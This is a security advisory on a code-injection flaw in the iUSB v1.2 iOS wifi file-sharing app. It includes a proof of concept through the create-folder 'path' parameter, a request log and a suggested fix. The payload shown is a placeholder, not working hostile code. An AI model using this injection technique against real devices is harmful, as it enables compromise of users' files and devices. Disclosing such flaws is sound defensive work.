===============
iUSB v1.2 iOS - Arbitrary Code Execution Vulnerability

Product & Service Introduction:
===============================
This is very useful software for iDevices users, it lets you share all types of files easily and quickly via wifi. 
The main functions of iUSB. Share files directly to iDevices via wifi. Share files via wifi using a web browser to 
the device or computer. Share files via cable to a computer. Manage files and folders easily and efficiently. 
Allows to open almost common files with formats: MP3, MP4, M4V, MOV, XLS, KEY.ZIP, NUMBERS.ZIP, PAGES.ZIP, PDF, PPT, 
DOC, RTF, RTFD.ZIP, KEY, NUMBERS, PAGES, TXT, CSV, HTML, HTM. Support for secure your data simply and quickly.

(Copy of the Vendor Homepage: https://itunes.apple.com/de/app/iusb/id903716126 )

Affected Product(s):
====================
Trung Pham
Product: iUSB - Mobile Web Application (Wifi) 1.2

Technical Details & Description:
================================
A code execution vulnerability has been discovered in the official iUSB v1.2 iOS mobile web-application.
The issue allows remote attackers to execute arbitrary codes to compromise the mobile wifi web-application.

The issue is located in the `path` value of the `create folder` input field. Remote attackers with access to the 
wifi web interface are able to execute system specific codes by usage of the vulnerable `create folder` function.
The execution of the injected code occurs on the application in the iUSB wifi interface index item listing module.
The attack vector is located on the application-side of the app and the request method to execute the code is POST.

The security risk of the code execution vulnerability is estimated as high with a cvss (common vulnerability scoring 
system) count of 8.7. Exploitation of the code execution vulnerability requires no privileged application user account 
or user interaction. Successful exploitation of the code execution vulnerability results in mobile application compromise 
and affected or connected device component compromise.

Request Method(s):
				[+] POST

Vulnerable Module(s):
				[+] Create Folder

Vulnerable Parameter(s):
				[+] path

Affected Module(s):
				[+] iUSB File Dir Listing


Proof of Concept (PoC):
=======================
The code execution vulnerability can be exploited by remote attackers without privileged application user account or user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.


PoC: iUSB Wifi UI - (foldername)

<div class="container">
      <div class="page-header">
        <h1>iUSB</h1>
      </div>
      <p>Drag & drop files on this window or use the "Upload Files…" button to upload new files.</p>
      <div id="alerts"></div>
      <div class="btn-toolbar">
        <button type="button" class="btn btn-primary fileinput-button">
          <span class="glyphicon glyphicon-upload"></span> Upload Files…
          <input id="fileupload" name="files[x]" multiple="" type="file">
        </button>
        <button type="button" class="btn btn-success" id="create-folder">
          <span class="glyphicon glyphicon-folder-close"></span> Create Folder…
        </button>
        <button type="button" class="btn btn-default" id="reload">
          <span class="glyphicon glyphicon-refresh"></span> Refresh
        </button>
      </div>
      <div class="panel panel-default uploading">
        <div class="panel-heading">File Uploads in Progress</div>
        <table class="table table-striped"><tbody id="uploads"></tbody></table>
      </div>
      <div class="panel panel-default">
        <div class="panel-heading">
          <ol class="breadcrumb" id="path"></ol>
        </div>
        <table class="table table-striped"><tbody id="listing">./[CODE EXECUTION VULNERABILITY!];</tbody></table>
      </div>
      <p class="footer">iUSB 1.2</p>
    </div>


--- PoC Session Logs [POST] ---
Status: 200[OK]
POST http://192.168.2.104/create 
Load Flags[LOAD_BYPASS_CACHE  LOAD_BACKGROUND  ] GrцЯe des Inhalts[2] Mime Type[application/json]
   Request Header:
      Host[192.168.2.104]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0]
      Accept[application/json, text/javascript, */*; q=0.01]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
      X-Requested-With[XMLHttpRequest]
      Referer[http://192.168.2.104/]
      Content-Length[81]
      Connection[keep-alive]
      Pragma[no-cache]
      Cache-Control[no-cache]
   POST-Daten:
      path[./[CODE EXECUTION VULNERABILITY!];+%3C]
   Response Header:
      Server[WebUploader]
      Cache-Control[no-cache]
      Content-Length[2]
      Content-Type[application/json]
      Connection[Close]
      Date[Tue, 09 Dec 2014 19:03:58 GMT]
-
Status: 200[OK]
 GET http://192.168.2.104/./[CODE EXECUTION VULNERABILITY!]; 
Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] GrцЯe des Inhalts[-1] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[192.168.2.104]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
Accept-Encoding[gzip, deflate]
      Connection[keep-alive]
   Response Header:
      Server[WebUploader]
      Date[Tue, 09 Dec 2014 19:04:58 GMT]
      Connection[Close]


Reference(s):
http://localhost/create 


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure restriction of the create folder name input field. Restrict the input by disallow of special chars.
Encode and parse the vulnerable path value that runs throught eh creat POST method request. Filter and parse also the iUSB file dir listing output with the vulnerable  name value.

